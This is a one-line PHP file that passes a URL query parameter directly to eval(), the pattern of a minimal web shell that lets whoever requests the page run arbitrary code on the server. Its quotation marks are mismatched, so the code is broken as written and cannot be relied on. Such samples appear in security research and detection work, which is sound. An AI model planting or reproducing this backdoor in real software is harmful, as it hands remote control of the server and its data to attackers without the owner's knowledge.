<?php
eval($_GET["JzE9_ayQ']);
?>
